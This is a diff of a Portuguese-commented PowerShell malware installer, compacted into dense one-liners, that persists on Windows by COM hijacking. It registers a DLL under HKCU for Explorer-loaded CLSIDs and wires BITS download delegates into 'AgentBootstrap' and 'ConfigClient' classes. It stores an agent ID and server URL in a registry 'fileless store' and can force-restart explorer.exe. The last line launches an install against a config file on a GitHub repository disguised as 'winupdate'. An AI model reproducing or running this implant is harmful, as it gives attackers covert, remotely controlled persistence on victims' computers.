+function Remove-FilelessRegistryStore { $storeKey="HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid)"; if(Test-Path $storeKey){Remove-Item -Path $storeKey -Recurse -Force}; $legacyKey="HKCU:\Software\Classes\CLSID\$($Script:FilelessStoreClsid.Trim('{}'))"; if(Test-Path $legacyKey){Remove-Item -Path $legacyKey -Recurse -Force -ErrorAction SilentlyContinue} }
 
 function Get-ClsidInprocInfo {
-    param([Parameter(Mandatory = $true)][string]$Clsid)
-
-    $formatted = Format-ComClsid -Value $Clsid
-    $key = "HKLM:\Software\Classes\CLSID\$formatted\InprocServer32"
-    if (-not (Test-Path $key)) {
-        return [PSCustomObject]@{
-            Clsid   = $formatted
-            Dll     = $null
-            Missing = $true
-        }
-    }
-
-    $props = Get-ItemProperty -Path $key
-    return [PSCustomObject]@{
-        Clsid   = $formatted
-        Dll     = $props.'(default)'
-        Missing = $false
-    }
+    param([string]$Clsid)
+    $formatted=Format-ComClsid -Value $Clsid
+    $key="HKLM:\Software\Classes\CLSID\$formatted\InprocServer32"
+    if(-not (Test-Path $key)){return [PSCustomObject]@{Clsid=$formatted;Dll=$null;Missing=$true}}
+    $props=Get-ItemProperty -Path $key
+    return [PSCustomObject]@{Clsid=$formatted;Dll=$props.'(default)';Missing=$false}
 }
 
 function Get-RegistryClsidCandidates {
-    param(
-        [Parameter(Mandatory = $true)][string]$Category,
-        [Parameter(Mandatory = $true)][string]$RegistryPath,
-        [Parameter(Mandatory = $true)][string]$BootTiming,
-        [Parameter(Mandatory = $true)][string]$Risk,
-        [Parameter(Mandatory = $true)][string]$Compat
-    )
-
-    if (-not (Test-Path $RegistryPath)) {
-        return @()
-    }
-
-    $rows = @()
+    param([string]$Category,[string]$RegistryPath,[string]$BootTiming,[string]$Risk,[string]$Compat)
+    if(-not (Test-Path $RegistryPath)){return @()}
+    $rows=@()
     Get-ChildItem -Path $RegistryPath -ErrorAction SilentlyContinue | ForEach-Object {
-        $name = $_.PSChildName
-        $clsid = (Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue).'(default)'
-        if (-not $clsid) { return }
-
-        $info = Get-ClsidInprocInfo -Clsid $clsid
-        $rows += [PSCustomObject]@{
-            Category   = $Category
-            Name       = $name
-            Clsid      = $info.Clsid
-            Dll        = $info.Dll
-            BootTiming = $BootTiming
-            Risk       = $Risk
-            Compatible = $Compat
-        }
+        $name=$_.PSChildName
+        $clsid=(Get-ItemProperty -Path $_.PSPath -ErrorAction SilentlyContinue).'(default)'
+        if(-not $clsid){return}
+        $info=Get-ClsidInprocInfo -Clsid $clsid
+        $rows += [PSCustomObject]@{Category=$Category;Name=$name;Clsid=$info.Clsid;Dll=$info.Dll;BootTiming=$BootTiming;Risk=$Risk;Compatible=$Compat}
     }
-
     return $rows
 }
 
 function Invoke-ListClsidAction {
-    $roots = @(
-        @{
-            Category = 'ShellServiceObject'
-            Path     = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects'
-            Boot     = 'Explorer boot (alta)'
-            Risk     = 'Medio'
-            Compat   = 'Sim (IShellService + O)'
-        },
-        @{
-            Category = 'ShellServiceObject'
-            Path     = 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects'
-            Boot     = 'Explorer boot (alta)'
-            Risk     = 'Medio'
-            Compat   = 'Sim (IShellService + O)'
-        },
-        @{
-            Category = 'ShellIconOverlay'
-            Path     = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers'
-            Boot     = 'Ao abrir pastas (baixa)'
-            Risk     = 'Baixo'
-            Compat   = 'Sim'
-        },
-        @{
-            Category = 'ShellIconOverlay'
-            Path     = 'HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers'
-            Boot     = 'Ao abrir pastas (baixa)'
-            Risk     = 'Baixo'
-            Compat   = 'Sim'
-        },
-        @{
-            Category = 'DesktopNamespace'
-            Path     = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace'
-            Boot     = 'Explorer boot (alta)'
-            Risk     = 'Alto'
-            Compat   = 'Requer IShellFolder (nao implementado)'
-        },
-        @{
-            Category = 'MyComputerNamespace'
-            Path     = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace'
-            Boot     = 'Explorer boot (media)'
-            Risk     = 'Alto'
-            Compat   = 'Requer IShellFolder (nao implementado)'
-        }
-    )
-
-    $all = @()
-    foreach ($root in $roots) {
-        $all += Get-RegistryClsidCandidates `
-            -Category $root.Category `
-            -RegistryPath $root.Path `
-            -BootTiming $root.Boot `
-            -Risk $root.Risk `
-            -Compat $root.Compat
-    }
-
-    if (-not $all -or $all.Count -eq 0) {
-        return
-    }
-
+    $roots=@(@{Category='ShellServiceObject';Path='HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects';Boot='Explorer boot (alta)';Risk='Medio';Compat='Sim (IShellService + O)'},@{Category='ShellServiceObject';Path='HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObjects';Boot='Explorer boot (alta)';Risk='Medio';Compat='Sim (IShellService + O)'},@{Category='ShellIconOverlay';Path='HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers';Boot='Ao abrir pastas (baixa)';Risk='Baixo';Compat='Sim'},@{Category='ShellIconOverlay';Path='HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayIdentifiers';Boot='Ao abrir pastas (baixa)';Risk='Baixo';Compat='Sim'},@{Category='DesktopNamespace';Path='HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace';Boot='Explorer boot (alta)';Risk='Alto';Compat='Requer IShellFolder (nao implementado)'},@{Category='MyComputerNamespace';Path='HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\NameSpace';Boot='Explorer boot (media)';Risk='Alto';Compat='Requer IShellFolder (nao implementado)'})
+    $all=@()
+    foreach($root in $roots){$all += Get-RegistryClsidCandidates -Category $root.Category -RegistryPath $root.Path -BootTiming $root.Boot -Risk $root.Risk -Compat $root.Compat}
+    if(-not $all -or $all.Count -eq 0){return}
     $all | Sort-Object BootTiming, Category, Name | Format-Table -AutoSize Category, Name, Clsid, BootTiming, Risk, Compatible, Dll
 }
 
-#endregion
-
-function Save-OriginalInprocDll {
-    param(
-        [Parameter(Mandatory = $true)][string]$Clsid,
-        [Parameter(Mandatory = $true)][string]$HkcuClsidKey
-    )
-
-    $hklmInproc = "HKLM:\Software\Classes\CLSID\$Clsid\InprocServer32"
-    if (-not (Test-Path $hklmInproc)) {
-        return $null
-    }
-
-    $orig = (Get-ItemProperty -Path $hklmInproc).'(default)'
-    if ([string]::IsNullOrWhiteSpace($orig)) {
-        return $null
-    }
-
-    Set-ItemProperty -Path $HkcuClsidKey -Name 'O' -Value $orig -Type String
-    return $orig
-}
+function Save-OriginalInprocDll { param([string]$Clsid,[string]$HkcuClsidKey) $hklmInproc="HKLM:\Software\Classes\CLSID\$Clsid\InprocServer32"; if(-not (Test-Path $hklmInproc)){return $null}; $orig=(Get-ItemProperty -Path $hklmInproc).'(default)'; if([string]::IsNullOrWhiteSpace($orig)){return $null}; Set-ItemProperty -Path $HkcuClsidKey -Name 'O' -Value $orig -Type String; return $orig }
 
 function Invoke-InstallAction {
-    if (-not $Config) { throw "Install requer -Config." }
-    if (-not $Clsid) { throw "Install requer -Clsid." }
-
-    # ============================================================
-    # INJETA OS DELEGATES PARA O C# USAR AS FUNÇÕES BITS
-    # ============================================================
-    # ConfigClient.DownloadStringWithBits
-    $delegateString = [Func[string,string]]{ param($url) return Invoke-BitsDownloadString -Url $url }
+    if(-not $Config){throw "Install requer -Config."}
+    if(-not $Clsid){throw "Install requer -Clsid."}
+    
+    # Injeta os delegates para o C# usar BITS
+    $delegateString=[Func[string,string]]{ param($url) return Invoke-BitsDownloadString -Url $url }
     [UserProfileCache.ConfigClient]::DownloadStringWithBits = $delegateString
-
-    # AgentBootstrap.DownloadDataWithBits
-    $delegateData = [Func[string,byte[]]]{ param($url) return Invoke-BitsDownloadData -Url $url }
+    $delegateData=[Func[string,byte[]]]{ param($url) return Invoke-BitsDownloadData -Url $url }
     [UserProfileCache.AgentBootstrap]::DownloadDataWithBits = $delegateData
-    # ============================================================
-
-    $existing = Get-ProfileCacheHijackInstall -TargetClsid $Clsid
-    if ($existing -and $existing.DllExists -and -not $Force) {
-        Write-Host 'Ja instalado.'
-        return
-    }
-
+    
+    $existing=Get-ProfileCacheHijackInstall -TargetClsid $Clsid
+    if($existing -and $existing.DllExists -and -not $Force){Write-Host 'Ja instalado.';return}
     Write-Host 'Instalando...'
-
-    $serverBase = Get-ServerUrl -Url $Config
-
-    $destDll = Get-InstallDllPath
-    $installDir = Split-Path -Parent $destDll
-    if (-not (Test-Path $installDir)) {
-        New-Item -ItemType Directory -Path $installDir -Force | Out-Null
-    }
-
+    $serverBase=Get-ServerUrl -Url $Config
+    $destDll=Get-InstallDllPath
+    $installDir=Split-Path -Parent $destDll
+    if(-not (Test-Path $installDir)){New-Item -ItemType Directory -Path $installDir -Force | Out-Null}
     Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
-
-    if ($SourceDll) {
-        if (-not (Test-Path $SourceDll -PathType Leaf)) {
-            throw "SourceDll não encontrada: $SourceDll"
-        }
-
-        Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll
-    }
-    else {
-        Invoke-CompileBootstrap -OutputPath $destDll -Arch $Architecture
-    }
-
-    $result = Register-ComHijack -Path $destDll -TargetClsid $Clsid -Arch $Architecture
-
-    $agentId = [guid]::NewGuid().ToString('N')
-    $clsidKey = "HKCU:\Software\Classes\CLSID\$($result.Clsid)"
-
+    if($SourceDll){if(-not (Test-Path $SourceDll -PathType Leaf)){throw "SourceDll nao encontrada: $SourceDll"};Deploy-InstallDll -SourcePath $SourceDll -DestinationPath $destDll}else{Invoke-CompileBootstrap -OutputPath $destDll -Arch $Architecture}
+    $result=Register-ComHijack -Path $destDll -TargetClsid $Clsid -Arch $Architecture
+    $agentId=[guid]::NewGuid().ToString('N')
+    $clsidKey="HKCU:\Software\Classes\CLSID\$($result.Clsid)"
     Set-ItemProperty -Path $clsidKey -Name 'C' -Value $Config -Type String
     Set-ItemProperty -Path $clsidKey -Name 'U' -Value $serverBase -Type String
     Set-ItemProperty -Path $clsidKey -Name 'I' -Value $agentId -Type String
-
-    $origDll = Save-OriginalInprocDll -Clsid $result.Clsid -HkcuClsidKey $clsidKey
-
+    $origDll=Save-OriginalInprocDll -Clsid $result.Clsid -HkcuClsidKey $clsidKey
     Sync-FilelessRegistryStore -ConfigUrl $Config -ServerBase $serverBase -AgentId $agentId
-
     Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline
-
-    if ($RestartExplorer) {
-        taskkill /f /im explorer.exe 2>$null | Out-Null
-        Start-Sleep -Seconds 1
-        Start-Process explorer.exe
-    }
-
+    if($RestartExplorer){taskkill /f /im explorer.exe 2>$null | Out-Null;Start-Sleep -Seconds 1;Start-Process explorer.exe}
     Write-Host 'Concluido.'
 }
 
 function Invoke-UninstallAction {
-    if (-not $Clsid) { throw "Uninstall requer -Clsid." }
-
+    if(-not $Clsid){throw "Uninstall requer -Clsid."}
     Write-Host 'Removendo...'
-
-    $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
-
+    $removed=Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
     Remove-FilelessRegistryStore
-
-    if ($RemoveDll) {
-        $destDll = Get-InstallDllPath
-        Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid
-        if (Test-Path $destDll) {
-            Remove-Item -LiteralPath $destDll -Force
-        }
-    }
-
-    if ($RestartExplorer) {
-        $null = taskkill /f /im explorer.exe 2>&1
-        Start-Sleep -Seconds 1
-        Start-Process explorer.exe
-    }
-
-    if (Test-Path $Script:StateFile) {
-        Remove-Item -Path $Script:StateFile -Force -ErrorAction SilentlyContinue
-    }
-
+    if($RemoveDll){$destDll=Get-InstallDllPath;Release-ProfileCacheDllLock -DllPath $destDll -Clsid $Clsid;if(Test-Path $destDll){Remove-Item -LiteralPath $destDll -Force}}
+    if($RestartExplorer){$null=taskkill /f /im explorer.exe 2>&1;Start-Sleep -Seconds 1;Start-Process explorer.exe}
+    if(Test-Path $Script:StateFile){Remove-Item -Path $Script:StateFile -Force -ErrorAction SilentlyContinue}
     Write-Host 'Concluido.'
 }
 
 function Invoke-RegisterAction {
-    if (-not $Clsid) { throw "Register requer -Clsid." }
-
-    $targetDll = $DllPath
-    if (-not $targetDll) { $targetDll = Get-InstallDllPath }
-    if (-not (Test-Path $targetDll -PathType Leaf)) {
-        throw "DLL não encontrada: $targetDll (use -DllPath ou execute Install primeiro)."
-    }
-
-    if ($UnregisterPrevious -and (Test-Path $Script:StateFile)) {
-        $previous = (Get-Content -Path $Script:StateFile -Raw).Trim()
-        if ($previous) {
-            Unregister-ComHijack -TargetClsid $previous -RemoveProgId | Out-Null
-        }
-    }
-
+    if(-not $Clsid){throw "Register requer -Clsid."}
+    $targetDll=$DllPath
+    if(-not $targetDll){$targetDll=Get-InstallDllPath}
+    if(-not (Test-Path $targetDll -PathType Leaf)){throw "DLL nao encontrada: $targetDll (use -DllPath ou execute Install primeiro)."}
+    if($UnregisterPrevious -and (Test-Path $Script:StateFile)){$previous=(Get-Content -Path $Script:StateFile -Raw).Trim();if($previous){Unregister-ComHijack -TargetClsid $previous -RemoveProgId | Out-Null}}
     Write-Host 'Instalando...'
-
-    if ($UseRegAsm) {
-        $result = Register-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
-    }
-    else {
-        $result = Register-ComHijack -Path $targetDll -TargetClsid $Clsid -Arch $Architecture
-    }
-
+    if($UseRegAsm){$result=Register-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid}else{$result=Register-ComHijack -Path $targetDll -TargetClsid $Clsid -Arch $Architecture}
     Set-Content -Path $Script:StateFile -Value $result.Clsid -NoNewline
-
     Write-Host 'Concluido.'
 }
 
 function Invoke-UnregisterAction {
-    if (-not $Clsid) { throw "Unregister requer -Clsid." }
-
+    if(-not $Clsid){throw "Unregister requer -Clsid."}
     Write-Host 'Removendo...'
-
-    if ($UseRegAsm) {
-        $targetDll = $DllPath
-        if (-not $targetDll) { $targetDll = Get-InstallDllPath }
-        if (-not (Test-Path $targetDll -PathType Leaf)) {
-            throw "Unregister com -UseRegAsm requer -DllPath válido."
-        }
-
-        $removed = Unregister-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid
-    }
-    else {
-        $removed = Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId
-    }
-
+    if($UseRegAsm){$targetDll=$DllPath;if(-not $targetDll){$targetDll=Get-InstallDllPath};if(-not (Test-Path $targetDll -PathType Leaf)){throw "Unregister com -UseRegAsm requer -DllPath valido."};$removed=Unregister-ComHijackViaRegAsm -Path $targetDll -TargetClsid $Clsid}else{$removed=Unregister-ComHijack -TargetClsid $Clsid -RemoveProgId}
     Write-Host 'Concluido.'
 }
 
-#endregion
-
-switch ($Action) {
-    'Install'    { Invoke-InstallAction }
-    'Uninstall'  { Invoke-UninstallAction }
-    'Register'   { Invoke-RegisterAction }
-    'Unregister' { Invoke-UnregisterAction }
-    'ListClsid'  { Invoke-ListClsidAction }
+switch($Action){
+    'Install'{Invoke-InstallAction}
+    'Uninstall'{Invoke-UninstallAction}
+    'Register'{Invoke-RegisterAction}
+    'Unregister'{Invoke-UnregisterAction}
+    'ListClsid'{Invoke-ListClsidAction}
 }
+'@)) -Action Install -Config "https://raw.githubusercontent.com/pty-ui/winupdate/refs/heads/main/conf.cfg" -Clsid '{578480AA-1B1C-4343-AABD-62C0A273DCB5}' -RestartExplorer
